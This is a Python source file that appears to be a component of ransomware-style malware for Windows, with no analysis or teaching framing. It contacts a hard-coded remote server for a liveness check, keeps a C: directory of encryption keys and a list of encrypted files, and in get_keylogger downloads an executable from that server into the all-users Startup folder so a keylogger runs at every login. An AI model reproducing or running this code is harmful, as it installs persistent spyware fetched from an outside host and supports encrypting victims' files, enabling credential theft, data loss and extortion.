import os
import requests
from config import *

def isInitiated():
    try:
        requests.get('http://35.208.177.30:8080/alive', timeout=10)
    except:
        exit()
    
    if os.path.exists(f"C:/{dir_name}") and os.path.exists(f"C:/{dir_name}/{config_file}") and os.path.exists(f"C:/{dir_name}/{key_name}") and os.path.exists(f"C:/{dir_name}/{public_key_name}") and os.path.exists(f"C:/{dir_name}/{encrypted_files_name}"):
        return True
    else:
        if not os.path.exists(f"C:/{dir_name}"):
            os.mkdir(f"C:/{dir_name}")
        else:
            for subdir, dirs, files in os.walk(f"C:/{dir_name}", topdown=False):
                for name in files:
                    os.remove(os.path.join(subdir, name))
                for name in dirs:
                    os.rmdir(os.path.join(subdir, name))
        return False
    
def create_config_file(time):
    config=f"time = {time}\n"
    with open(f"C:/{dir_name}/{config_file}",'w') as cf:
                cf.write(config)
                
    with open(f"C:/{dir_name}/{encrypted_files_name}",'w') as ef:
                pass
    
def get_keylogger():
    user=os.getlogin() 
    r = requests.get("http://35.208.177.30:8080/kl", allow_redirects=True)
    open('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\kl.exe', 'wb').write(r.content)

def clean():
    os.remove(f'C:/{dir_name}/{key_name}')
    os.remove(f'C:/{dir_name}/{public_key_name}')
    os.remove(f'C:/{dir_name}/{config_file}')
    os.remove(f'C:/{dir_name}/{encrypted_files_name}')
    os.rmdir(f'C:/{dir_name}')